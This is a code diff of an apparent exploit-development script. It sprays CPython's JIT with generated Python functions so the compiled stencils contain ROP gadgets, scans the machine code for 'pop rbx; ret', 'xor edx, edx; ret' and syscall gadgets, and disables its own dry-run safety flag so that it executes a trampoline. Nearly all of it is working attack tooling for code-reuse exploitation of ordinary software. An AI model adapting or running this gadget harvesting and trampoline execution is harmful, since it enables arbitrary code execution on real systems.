@@ -51,6 +51,12 @@ def f(x):
     def h(a, b):
         return (a ^ b) & 0xFFFFFFFF
 
+    # Dictionary and object operations to trigger STORE_SUBSCR_DICT, LOAD_ATTR, COMPARE_OP stencils
+    d = {{}}
+    class Obj:
+        val = 0
+
+    obj = Obj()
     acc = x
     for i in range({3000 + seed * 500}):
         acc ^= ({magic_value} + (i << (i % 8)))
@@ -60,8 +66,26 @@ def f(x):
         acc ^= (acc >> ((i+3) % 8))
         acc ^= ({magic_value} + i) * ((acc >> 3) & 0xff)
         acc += (i ^ {magic_value})
-        # Call site intended to increase odds of xor edx, edx near ret in JIT stencils
-        acc = h(acc, i & 0xff)
+        
+        # Trigger various stencils
+        acc = h(acc, i & 0xff)  # CALL stencils
+        
+        # Dictionary operations (STORE_SUBSCR_DICT, BINARY_SUBSCR)
+        if i % 100 == 0:
+            d[i] = acc & 0xff
+            acc ^= d.get(i, 0)
+        
+        # Attribute access (LOAD_ATTR, STORE_ATTR)
+        if i % 200 == 0:
+            obj.val = acc & 0xffff
+            acc += obj.val
+        
+        # Comparison operations (COMPARE_OP_INT)
+        if acc > {magic_value}:
+            acc -= 1
+        elif acc < (i & 0xff):
+            acc += 1
+    
     return acc
 """
     scope = {}
@@ -84,10 +108,27 @@ def find_gadgets(jit_addr, blob, gadgets_needed):
                 key = f"{mnemonic} {operand}".strip()
                 if key in found:
                     continue
+                
+                # Standard pop/syscall gadgets followed by ret
                 if (insns[0].mnemonic == mnemonic and operand in insns[0].op_str and
                     insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
                     found[key] = insns[0].address
                     print(f"[+] Found gadget: {key}; ret @ {hex(insns[0].address)}")
+                
+                # Special handling for xor edx, edx; ret
+                elif (mnemonic == "xor" and operand == "edx, edx" and
+                      insns[0].mnemonic == "xor" and "edx" in insns[0].op_str and
+                      insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
+                    found[key] = insns[0].address
+                    print(f"[+] Found gadget: {key}; ret @ {hex(insns[0].address)}")
+                
+                # pop rbx; ret
+                elif (mnemonic == "pop" and operand == "rbx" and
+                      insns[0].mnemonic == "pop" and "rbx" in insns[0].op_str and
+                      insns[1].mnemonic == 'ret' and insns[1].op_str.strip() == ""):
+                    found[key] = insns[0].address
+                    print(f"[+] Found gadget: {key}; ret @ {hex(insns[0].address)}")
+    
     return found
 
 def load_stencil_stats(path="stencil_gadgets.json"):
@@ -219,7 +260,7 @@ def main():
 
     # Configurable parameters (can be wired to argparse if needed)
     num_runs = 6
-    dry_run = True  # Safe mode first: do not execute trampoline
+    dry_run = False  # Execute trampoline now
     for seed in range(num_runs):
         if not remaining_gadgets:
             print("[*] 모든 가젯을 찾았습니다. 추가 탐색 중지.")
